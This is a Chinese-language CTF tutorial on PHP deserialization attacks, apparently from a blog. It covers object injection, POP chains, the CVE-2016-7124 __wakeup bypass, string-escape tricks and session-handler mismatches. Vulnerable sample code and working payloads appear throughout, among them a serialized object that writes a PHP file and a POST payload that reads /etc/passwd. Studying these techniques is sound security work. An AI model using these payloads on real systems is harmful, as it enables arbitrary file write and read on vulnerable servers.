其中在这两个函数的定义中，$name是这调用方法的名字，$argument是传递给该函数参数的数组 对象注入在存在一个用户可控的unserialize()函数的参数时，我们可以构造特定的序列化字符串来达到创建任意类的目的，如果这个类有存在着__wakeup()，__destruct()等魔术方法且存在一些可以利用的函数，这里就可以利用这个类进行一波操作 举个例子： 12345678910111213&lt;?phphighlight_file(__FILE__);class logger&#123; public $filename=&#x27;log.txt&#x27;; public $content=&#x27;nothing to log&#x27;; public function __destruct()&#123; file_put_contents($this-&gt;filename,$this-&gt;content); &#125;&#125;if(isset($_GET[&#x27;obj&#x27;]))&#123; @unserialize($_GET[&#x27;obj&#x27;]);&#125; 我们只要构造合适的php序列化字符串传入，覆盖$filename和$content然后触发__destruct()方法就可以成功实现任意文件写入了 payload： 1234567891011&lt;?phpclass logger&#123; public $filename=&#x27;a.php&#x27;; public $content=&#x27;&lt;?php phpinfo();?&gt;&#x27;; public function __destruct()&#123; file_put_contents($this-&gt;filename,$this-&gt;content); &#125;&#125;$a=new logger();echo serialize($a);/*O:6:&quot;logger&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;a.php&quot;;s:7:&quot;content&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;*/ 传入一下，成功 POP链POP：面向属性编程 是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。 一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。 来个例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phphighlight_file(__FILE__);class start_gg&#123; public $mod1; public $mod2; public function __destruct() &#123; $this-&gt;mod1-&gt;test1(); &#125;&#125;class Call&#123; public $mod1; public $mod2; public function test1() &#123; $this-&gt;mod1-&gt;test2(); &#125;&#125;class funct&#123; public $mod1; public $mod2; public function __call($test2,$arr) &#123; $s1 = $this-&gt;mod1; $s1(); &#125;&#125;class func&#123; public $mod1; public $mod2; public function __invoke() &#123; $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1; &#125; &#125;class string1&#123; public $str1; public $str2; public function __toString() &#123; $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; &#125;&#125;class GetFlag&#123; public function get_flag() &#123; echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; &#125;&#125;$a = $_GET[&#x27;string&#x27;];unserialize($a);?&gt; 总结一下，pop链如下： 123456start_gg-&gt;__destruct();Call-&gt;test1();funct-&gt;__call();func-&gt;__invoke();string1-&gt;__toString();GetFlag-&gt;get_flag(); 这里我们看见我们想要执行的函数是是GetFlag-&gt;get_flag()，我们可以试着倒着推上去 此处POP想要执行GetFlag类的get_flag()方法，可以看见在string1类中的__toString()方法调用了$this-&gt;str1-&gt;get_flag()方法所以我们的$this-&gt;str1可以赋值为GetFlag类来使用这个同名函数 而想要调用到string1类的__toString()方法则需要找到一个成员变量被作为字符串调用的地方，于是我们可以看到func类的__invoke方法，$this-&gt;mod1变量被作为字符串拼接使用了， 而继续寻找可用的调用链我们可以找到funct类的__call方法和Call类的test1方法，而最终通过寻找同名函数的方式可以找到POP链的顶端是start_gg类的析构方法，可以通过对象注入自动调用 payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpclass start_gg&#123; public $mod1; public $mod2; public function __construct() &#123; $this-&gt;mod1=new Call(); &#125; &#125;class Call&#123; public $mod1; public $mod2; public function __construct() &#123; $this-&gt;mod1=new funct(); &#125; &#125;class funct&#123; public $mod1; public $mod2; public function __construct() &#123; $this-&gt;mod1=new func(); &#125; &#125;class func&#123; public $mod1; public $mod2; public function __construct() &#123; $this-&gt;mod1=new string1(); &#125; &#125;class string1&#123; public $str1; public $str2; public function __construct()&#123; $this-&gt;str1=new GetFlag(); &#125;&#125;class GetFlag&#123;&#125;$a = new start_gg();echo serialize($a);?&gt; PHP __wakeup魔术方法绕过CVE-2016-7124 可利用的版本： PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10 内容：当php序列化字符串中对象成员个数大于真实的成员个数时会跳过wakeup方法的执行 例子： 123456789101112131415161718192021222324252627&lt;?php class SoFun&#123; protected $file=&#x27;wakeup.php&#x27;; function __destruct()&#123; if(!empty($this-&gt;file)) &#123; if(strchr($this-&gt; file,&quot;\\\\&quot;)===false &amp;&amp; strchr($this-&gt;file, &#x27;/&#x27;)===false) show_source(dirname (__FILE__).&#x27;/&#x27;.$this -&gt;file); else die(&#x27;Wrong filename.&#x27;); &#125; &#125; function __wakeup()&#123; $this-&gt; file=&#x27;index.php&#x27;; &#125; public function __toString() return &#x27;&#x27; ; &#125;&#125; if (!isset($_GET[&#x27;file&#x27;]))&#123; show_source(&#x27;wakeup.php&#x27;);&#125;else&#123; $file=base64_decode($_GET[&#x27;file&#x27;]); echo unserialize($file); &#125;?&gt; &lt;!--key in flag.php--&gt; payload: O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\\00*\\00file&quot;;s:8:&quot;flag.php&quot;;&#125; base64一下发过去就可以发现绕过了__wakeup()函数 反序列化字符逃逸如果在序列化的字符串中暴力地对反序列化字符串进行简单的字符替换处理，则可能会出现字符逃逸的情况，这个情况有点类似于SQL注入 我们来看一个例子 1234567891011121314&lt;?phpfunction filter($string)&#123; $filter = &#x27;/p/i&#x27;; return preg_replace($filter,&#x27;WW&#x27;,$string);&#125;$username = &#x27;purplet&#x27;;$age = &quot;10&quot;;$user = array($username, $age);var_dump(serialize($user));//string(37) &quot;a:2:&#123;i:0;s:7:&quot;purplet&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;echo &quot;&lt;pre&gt;&quot;;$r = filter(serialize($user));var_dump($r);//string(39) &quot;a:2:&#123;i:0;s:7:&quot;WWurWWlet&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;var_dump(unserialize($r));?&gt; 这个地方我们强行地把序列化后的字符串直接进行正则替换，将大小写的P替换成两个W，这导致了php在反序列化时读完前面对应的字符以后后面超过长度的部分被推出来了 这个地方我们可以尝试利用字符逃逸把数组里面的age从10替换成我们想要的值 如果我们把部分序列化的字符串放在$username的后面，我们如果想要把&quot;;i:1;s:4:&quot;neko&quot;;&#125;部分全部推出去的话，需要增加相同长度的字符，而&quot;;i:1;s:4:&quot;neko&quot;;&#125;的长度为18，则构造前面的字符串的长度为18 那么情况将会变成这样： 1234567891011121314&lt;?phpfunction filter($string)&#123; $filter = &#x27;/p/i&#x27;; return preg_replace($filter,&#x27;WW&#x27;,$string);&#125;$username = &#x27;purppppppppppppppppplet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&#x27;;$age = &quot;10&quot;;$user = array($username, $age);var_dump(serialize($user));//string(72) &quot;a:2:&#123;i:0;s:41:&quot;purppppppppppppppppplet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;echo &quot;&lt;pre&gt;&quot;;$r = filter(serialize($user));var_dump($r);//string(90) &quot;a:2:&#123;i:0;s:41:&quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;var_dump(unserialize($r));?&gt; 最终php将a:2:&#123;i:0;s:41:&quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot;;i:1;s:4:&quot;neko&quot;;&#125;作为正常的序列化字符串进行反序列化，而且后面被推出去的部分被php忽略了 123456array(2) &#123; [0]=&gt; string(41) &quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot; [1]=&gt; string(4) &quot;neko&quot;&#125; 这样我们实现了把数组的后面的元素覆盖为我们想要的元素的目的 这种情况是字符增多的，下面我们来看一道CTF真题，是字符减少的情形 [安洵杯 2019]easy_serialize_php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 我们可以看见这题把序列化后的字符串直接传入了filter()方法，而filter方法中我们可以看见他直接使用了perg_replace方法把’php’,’flag’,’php5’,’php4’,’fl1g’字符串替换为空，而这里反序列化的变量是$_SESSION，我们可以直接通过这题存在的一个extract，参数是$_POST，进行变量覆盖，把$_session变量覆盖为我们想要的值，这样就可以实现参数可控了 这一题我们最终要实现的目的是利用最后的file_get_contents实现任意文件读取，这里我们就可以利用字符逃逸把前面固定赋值的img参数吃掉，然后插入我们想要的参数 payload如下： 1234#POST请求_SESSION[a]=phpphpphpphpphp&amp;_SESSION[b]=;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;#GET请求?f=show_image 我们来看一下结果 直接序列化的输出是： a:3:&#123;s:1:&quot;a&quot;;s:15:&quot;phpphpphpphpphp&quot;;s:1:&quot;b&quot;;s:52:&quot;;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 经过字符串过滤以后： a:3:&#123;s:1:&quot;a&quot;;s:15:&quot;&quot;;s:1:&quot;b&quot;;s:52:&quot;;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 这个地方可以看见我在这里构造了5个php总共15个字符，刚好是后面&quot;;s:1:&quot;b&quot;;s:52:的长度 这样一来，原来标识字符串长度为52的那一部分就被吃掉了，而变成了字符串的一部分，而原来字符串的部分则被作为序列化的数据处理了 最终的结果是： 12345678array(3) &#123; [&quot;a&quot;]=&gt; string(15) &quot;\\&quot;;s:1:&quot;b&quot;;s:56:&quot; [&quot;x&quot;]=&gt; string(1) &quot;x&quot; [&quot;img&quot;]=&gt; string(20) &quot;L2QwZzNfZmxsbGxsbGFn&quot;&#125; 成功覆盖到img的值 PHP session 反序列化漏洞session是一种服务器标识用户的一种手段，php通过给用户分配session_id来表示每一个用户，同时也会在服务器上以文件的形式保存用户的session信息 需要使用session时我们需要使用$_SESSION全局变量，全局变量的内容会根据用户的session_id来命名一个文件，并保存在服务器上，文件名的格式为sess_用户的session_id 储存文件的位置可以在phpinfo的session.save_path里看到 php在session存储和读取时，或者是session在初始化的时候会有一个序列化和反序列化的过程，php内置了多种存储引擎用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化 以下展示三种不同的存储引擎的存储方式： 存储引擎名称 存储结构 php 键名|序列化以后的值 php_binary 键名的长度（对应的ascii字符）+键名+serialize()处理的数据 php_serialize serialize()以后的数据 这些储存引擎可以在php.ini来配置，配置的键名是session.serialize_handler 当在同时使用两种不同的引擎的时候，就有可能可以触发反序列化 写一个例子 12345678910111213141516171819&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;w4&#x27;] = $_GET[&#x27;a&#x27;];var_dump($_SESSION);?&gt;//2.php&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();var_dump($_SESSION);class test&#123; public $name; function __wakeup()&#123; echo $this-&gt;name; &#125;&#125;?&gt; 这里代码来自y4师傅的博客，我自己稍微修改了一下 可以看见这个地方传入一个a=w4rsp1t3 可以看到已经有session文件生成了，内容是：a:1:&#123;s:2:&quot;w4&quot;;s:8:&quot;w4rsp1t3&quot;;&#125; 如果访问2.php会发现session变量什么都没有，因为2.php的存储引擎和1.php的不相同，解析失败，而如果我们在1.php前面传入反序列化的payload，并且在前面加一个管道符，如下： |O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;w4rsp1t3&quot;;&#125; 传入以后session文件如下： a:1:&#123;s:2:&quot;w4&quot;;s:42:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;w4rsp1t3&quot;;&#125;&quot;;&#125; 这个时候访问2.php，在session_start()执行时，php引擎就会自动把后面那一串作为session的数据进行反序列化，这个时候就会触发代码的__wakeup()方法 phar触发的反序列化有些时候环境里面没有反序列化入口点，我们这里就可以寻找可以使用phar://协议的地方来配合文件上传等漏洞来进行反序列化","categories":[{"name":"php","slug":"php","permalink":"http://77up.top/categories/php/"},{"name":"ctf","slug":"ctf","permalink":"http://77up.top/categories/ctf/"}],"tags":[{"name":"php","slug":"php","permalink":"http://77up.top/tags/php/"},{"name":"ctf","slug":"ctf","permalink":"http://77up.top/tags/ctf/"}]}],"categories":[{"name":"php","slug":"php","permalink":"http://77up.top/categories/php/"},{"name":"python","slug":"python","permalink":"http://77up.top/categories/python/"},{"name":"web","slug":"web","permalink":"http://77up.top/categories/web/"},{"name":"ctf","slug":"ctf","permalink":"http://77up.top/categories/ctf/"}],"tags":[{"name":"php","slug":"php","permalink":"http://77up.top/tags/php/"},{"name":"日常","slug":"日常","permalink":"http://77up.top/tags/%E6%97%A5%E5%B8%B8/"},{"name":"web","slug":"web","permalink":"http://77up.top/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://77up.top/tags/ctf/"}]}